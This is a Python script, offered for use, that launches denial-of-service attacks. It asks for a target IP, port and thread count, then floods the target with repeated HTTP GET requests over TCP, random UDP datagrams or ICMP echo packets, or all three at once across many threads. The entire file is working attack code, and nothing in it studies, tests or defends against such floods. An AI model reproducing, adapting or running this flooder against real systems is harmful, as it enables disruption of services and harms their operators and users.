import socket
import threading
import random
import time
import os

# Configuration
TARGET_IP = input("Enter target IP: ")
TARGET_PORT = int(input("Enter target port: "))
THREADS = int(input("Enter number of threads: "))
PACKET_SIZE = 1024

# Packet crafting
def craft_packet():
    packet = b"GET / HTTP/1.1\r\n"
    packet += b"Host: " + TARGET_IP.encode() + b"\r\n"
    packet += b"User-Agent: GoldenEye\r\n"
    packet += b"Accept: */*\r\n"
    packet += b"\r\n"
    return packet * (PACKET_SIZE // len(packet))

# Attack function
def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    while True:
        try:
            sock.send(craft_packet())
            time.sleep(random.uniform(0.01, 0.1))
        except socket.error:
            break

# UDP Flood function
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(os.urandom(PACKET_SIZE), (TARGET_IP, TARGET_PORT))
            time.sleep(random.uniform(0.01, 0.1))
        except socket.error:
            break

# ICMP Flood function
def icmp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        try:
            sock.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x00", (TARGET_IP, 0))
            time.sleep(random.uniform(0.01, 0.1))
        except socket.error:
            break

# Main function
def main():
    print("Select attack type:")
    print("1. TCP Flood")
    print("2. UDP Flood")
    print("3. ICMP Flood")
    print("4. All")
    
    choice = input("Enter choice: ")
    
    if choice == "1":
        for _ in range(THREADS):
            threading.Thread(target=attack).start()
            
    elif choice == "2":
        for _ in range(THREADS):
            threading.Thread(target=udp_flood).start()
            
    elif choice == "3":
        for _ in range(THREADS):
            threading.Thread(target=icmp_flood).start()
            
    elif choice == "4":
        for _ in range(THREADS):
            threading.Thread(target=attack).start()
        for _ in range(THREADS):
            threading.Thread(target=udp_flood).start()
        for _ in range(THREADS):
            threading.Thread(target=icmp_flood).start()

if __name__ == "__main__":
    main()
